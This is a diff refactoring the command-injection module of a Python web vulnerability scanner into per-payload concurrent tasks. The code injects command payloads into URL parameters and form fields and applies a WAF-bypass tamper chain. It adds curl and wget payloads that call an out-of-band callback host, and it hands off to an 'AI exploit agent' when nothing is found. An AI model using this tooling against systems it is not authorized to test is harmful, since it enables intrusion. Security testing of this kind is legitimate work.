@@ -58,110 +58,70 @@ def detect_cmdi(text):
 
     return None, None
 
-def _test_cmdi_param(param, params, parsed, delay, target_context=None):
-    """Test a single param for CMDi - error-based only (helper for threading)"""
-    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
-    probe = probe_cmdi_context(
-        urlunparse(parsed), param, flat_params, method="get", delay=delay
-    )
-    smart = probe.get("smart_payloads", [])
-    if smart:
-        all_payloads = smart + [p for p in CMDI_PAYLOADS if p not in smart]
-    else:
-        all_payloads = list(CMDI_PAYLOADS)
+import functools
+from utils.concurrency import run_concurrent_tasks
 
-    if target_context:
-        all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)
-
-    oob_client = get_oob_client()
-    if oob_client and oob_client.ready:
-        oob_url = oob_client.generate_payload("cmdi", param)
-        all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
-
-    for payload in all_payloads:
-        if "sleep" in payload.lower():
-            continue
-
-        test_params = params.copy()
-        test_params[param] = [payload]
-        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
-        try:
-            resp = smart_request("get", test_url, delay=delay)
-            cmd_type, sig = detect_cmdi(resp.text)
-            if cmd_type:
-                increment_vulnerability_count()
-                source = "🧠 Smart" if payload in smart else "📋 Static"
-                log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
-                log_success(f"Param: {param} | Type: {cmd_type} | Output: {sig}")
-                log_success(f"Payload: {payload}")
-                return {
-                    "type": "CMDi_Param",
-                    "param": param,
-                    "payload": payload,
-                    "cmd_type": cmd_type,
-                    "url": test_url,
-                }
-        except ScanExceptions:
-            pass
+def _test_cmdi_param_payload(payload, param, params, parsed, delay, smart):
+    if "sleep" in payload.lower():
+        return None
+    test_params = params.copy()
+    test_params[param] = [payload]
+    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
+    try:
+        resp = smart_request("get", test_url, delay=delay)
+        cmd_type, sig = detect_cmdi(resp.text)
+        if cmd_type:
+            increment_vulnerability_count()
+            source = "🧠 Smart" if payload in smart else "📋 Static"
+            log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
+            log_success(f"Param: {param} | Type: {cmd_type} | Output: {sig}")
+            log_success(f"Payload: {payload}")
+            return {
+                "type": "CMDi_Param",
+                "param": param,
+                "payload": payload,
+                "cmd_type": cmd_type,
+                "url": test_url,
+            }
+    except ScanExceptions:
+        pass
     return None
 
-def _test_cmdi_form_input(inp, inputs, hidden_data, method, target, delay, target_context=None):
-    """Test a single form input for CMDi - error-based only (helper for threading)"""
-    form_data = {n: "127.0.0.1" for n in inputs}
+def _test_cmdi_form_payload(payload, inp, inputs, hidden_data, method, target, delay, smart):
+    if "sleep" in payload.lower():
+        return None
+    data = {n: "127.0.0.1" for n in inputs}
     if hidden_data:
-        form_data.update(hidden_data)
-    probe = probe_cmdi_context(
-        target, inp, {}, method=method, form_data=form_data, delay=delay
-    )
-    smart = probe.get("smart_payloads", [])
-    if smart:
-        all_payloads = smart + [p for p in CMDI_PAYLOADS if p not in smart]
-    else:
-        all_payloads = list(CMDI_PAYLOADS)
-
-    if target_context:
-        all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)
-
-    oob_client = get_oob_client()
-    if oob_client and oob_client.ready:
-        oob_url = oob_client.generate_payload("cmdi", inp)
-        all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
-
-    for payload in all_payloads:
-        if "sleep" in payload.lower():
-            continue
-
-        data = {n: "127.0.0.1" for n in inputs}
-        if hidden_data:
-            data.update(hidden_data)
-        data[inp] = payload
-        try:
-            resp = smart_request(
-                method,
-                target,
-                data=data if method == "post" else None,
-                params=data if method != "post" else None,
-                delay=delay,
-            )
-            cmd_type, sig = detect_cmdi(resp.text)
-            if cmd_type:
-                increment_vulnerability_count()
-                source = "🧠 Smart" if payload in smart else "📋 Static"
-                log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
-                log_success(f"Form field: {inp} | Type: {cmd_type}")
-                log_success(f"Payload: {payload}")
-                return {
-                    "type": "CMDi_Form",
-                    "field": inp,
-                    "payload": payload,
-                    "cmd_type": cmd_type,
-                    "url": target,
-                    "method": method,
-                    "hidden_data": hidden_data,
-                }
-        except ScanExceptions:
-            pass
+        data.update(hidden_data)
+    data[inp] = payload
+    try:
+        resp = smart_request(
+            method,
+            target,
+            data=data if method == "post" else None,
+            params=data if method != "post" else None,
+            delay=delay,
+        )
+        cmd_type, sig = detect_cmdi(resp.text)
+        if cmd_type:
+            increment_vulnerability_count()
+            source = "🧠 Smart" if payload in smart else "📋 Static"
+            log_vuln(f"COMMAND INJECTION FOUND! [{source}]")
+            log_success(f"Form field: {inp} | Type: {cmd_type}")
+            log_success(f"Payload: {payload}")
+            return {
+                "type": "CMDi_Form",
+                "field": inp,
+                "payload": payload,
+                "cmd_type": cmd_type,
+                "url": target,
+                "method": method,
+                "hidden_data": hidden_data,
+            }
+    except ScanExceptions:
+        pass
     return None
+
 
 def _test_blind_cmdi_sequential(url, forms, delay, target_context=None):
     """Test blind CMDi (time-based) - runs sequentially for accurate timing"""
@@ -323,7 +283,6 @@ def _test_blind_cmdi_sequential(url, forms, delay, target_context=None):
     return vulns
 
 def scan_cmdi(url, forms, delay, options=None, threads=None):
-    """Scan for Command Injection vulnerabilities (threaded)"""
     from utils.tamper import get_tamper_chain
 
     if threads is None:
@@ -332,102 +291,93 @@ def scan_cmdi(url, forms, delay, options=None, threads=None):
     options = options or {}
     target_context = options.get("target_context")
 
-    # Apply tamper chain for WAF bypass variants
     chain = get_tamper_chain()
     payloads = list(CMDI_PAYLOADS)
     if chain.active:
         payloads = chain.apply_list(payloads)
 
-    log_info(
-        f"Testing Command Injection with {len(payloads)} payloads ({threads} threads)..."
-    )
+    log_info(f"Testing Command Injection with {len(payloads)} payloads ({threads} threads)...")
     vulns = []
+    tasks = []
 
-    # 1. Error-based CMDi (threaded)
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = []
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    
+    for param in params.keys():
+        flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
+        probe = probe_cmdi_context(urlunparse(parsed), param, flat_params, method="get", delay=delay)
+        smart = probe.get("smart_payloads", [])
+        all_payloads = smart + [p for p in payloads if p not in smart] if smart else payloads
+        if target_context:
+            all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)
+            
+        oob_client = get_oob_client()
+        if oob_client and oob_client.ready:
+            oob_url = oob_client.generate_payload("cmdi", param)
+            all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
+            
+        for payload in all_payloads:
+            tasks.append(functools.partial(_test_cmdi_param_payload, payload, param, params, parsed, delay, smart))
 
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-        for param in params.keys():
-            futures.append(
-                executor.submit(_test_cmdi_param, param, params, parsed, delay, target_context)
-            )
+    flattened_forms = []
+    for f in forms:
+        if isinstance(f, list):
+            flattened_forms.extend(f)
+        else:
+            flattened_forms.append(f)
 
-        flattened_forms = []
-        for f in forms:
-            if isinstance(f, list):
-                flattened_forms.extend(f)
-            else:
-                flattened_forms.append(f)
+    for form in flattened_forms:
+        if hasattr(form, "find_all"):
+            action = form.get("action") or url
+            method = form.get("method", "get").lower()
+            target = urljoin(url, action)
+            all_inputs = form.find_all(["input", "textarea"])
+            inputs = [i.get("name") for i in all_inputs if i.get("name") and i.get("type", "text") not in ["submit", "hidden", "button", "image"]]
+            hidden_data = {i.get("name"): i.get("value", "") for i in all_inputs if i.get("type") == "hidden" and i.get("name")}
+            submit_btn = form.find("input", {"type": "submit"})
+            if submit_btn and submit_btn.get("name"):
+                hidden_data[submit_btn.get("name")] = submit_btn.get("value", "Submit")
+        else:
+            action = form.get("action") or url
+            method = form.get("method", "get").lower()
+            target = urljoin(url, action)
+            raw_inputs = form.get("inputs", [])
+            inputs = []
+            hidden_data = {}
+            for i in raw_inputs:
+                if isinstance(i, dict):
+                    n = i.get("name")
+                    t = i.get("type", "text")
+                    if n:
+                        if t == "hidden" or t == "submit":
+                            hidden_data[n] = i.get("value", "Submit" if t == "submit" else "")
+                        elif t not in ["button", "image"]:
+                            inputs.append(n)
+            if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
+                inputs = raw_inputs
 
-        for form in flattened_forms:
-            if hasattr(form, "find_all"):
-                action = form.get("action") or url
-                method = form.get("method", "get").lower()
-                target = urljoin(url, action)
-                all_inputs = form.find_all(["input", "textarea"])
-                inputs = [
-                    i.get("name")
-                    for i in all_inputs
-                    if i.get("name")
-                    and i.get("type", "text") not in ["submit", "hidden", "button", "image"]
-                ]
-                hidden_data = {
-                    i.get("name"): i.get("value", "")
-                    for i in all_inputs
-                    if i.get("type") == "hidden" and i.get("name")
-                }
-                # Add submit button
-                submit_btn = form.find("input", {"type": "submit"})
-                if submit_btn and submit_btn.get("name"):
-                    hidden_data[submit_btn.get("name")] = submit_btn.get("value", "Submit")
-            else:
-                action = form.get("action") or url
-                method = form.get("method", "get").lower()
-                target = urljoin(url, action)
-                raw_inputs = form.get("inputs", [])
-                inputs = []
-                hidden_data = {}
-                for i in raw_inputs:
-                    if isinstance(i, dict):
-                        n = i.get("name")
-                        t = i.get("type", "text")
-                        if n:
-                            if t == "hidden" or t == "submit":
-                                hidden_data[n] = i.get("value", "Submit" if t == "submit" else "")
-                            elif t not in ["button", "image"]:
-                                inputs.append(n)
-                if not inputs and raw_inputs and isinstance(raw_inputs[0], str):
-                    inputs = raw_inputs
+        for inp in inputs:
+            form_data = {n: "127.0.0.1" for n in inputs}
+            if hidden_data: form_data.update(hidden_data)
+            probe = probe_cmdi_context(target, inp, {}, method=method, form_data=form_data, delay=delay)
+            smart = probe.get("smart_payloads", [])
+            all_payloads = smart + [p for p in payloads if p not in smart] if smart else payloads
+            if target_context:
+                all_payloads = PayloadFilter.filter_payloads(all_payloads, target_context)
+                
+            oob_client = get_oob_client()
+            if oob_client and oob_client.ready:
+                oob_url = oob_client.generate_payload("cmdi", inp)
+                all_payloads.extend([f"; curl '{oob_url}' ;", f"| wget -qO- '{oob_url}' |"])
+                
+            for payload in all_payloads:
+                tasks.append(functools.partial(_test_cmdi_form_payload, payload, inp, inputs, hidden_data, method, target, delay, smart))
 
-            for inp in inputs:
-                futures.append(
-                    executor.submit(
-                        _test_cmdi_form_input,
-                        inp,
-                        inputs,
-                        hidden_data,
-                        method,
-                        target,
-                        delay,
-                        target_context
-                    )
-                )
+    vulns.extend(run_concurrent_tasks(tasks, max_workers=threads))
 
-        for future in as_completed(futures):
-            try:
-                result = future.result()
-                if result:
-                    vulns.append(result)
-            except ScanExceptions:
-                pass
-
-    # 2. Blind CMDi (sequential - timing accuracy)
     blind_vulns = _test_blind_cmdi_sequential(url, forms, delay, target_context)
     vulns.extend(blind_vulns)
 
-    # ── AI Exploit Agent (Final Escalation) ──
     if not vulns and params:
         try:
             from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
@@ -437,13 +387,7 @@ def scan_cmdi(url, forms, delay, options=None, threads=None):
                 waf_name = getattr(waf_detector, "detected_waf", "") or ""
 
                 for param in params:
-                    ctx = ExploitContext(
-                        url=url,
-                        param=param,
-                        vuln_type="CMDi",
-                        waf=waf_name,
-                        http_method="GET",
-                    )
+                    ctx = ExploitContext(url=url, param=param, vuln_type="CMDi", waf=waf_name, http_method="GET")
                     result = agent.exploit_cmdi(ctx)
                     if result and result.success:
                         increment_vulnerability_count()
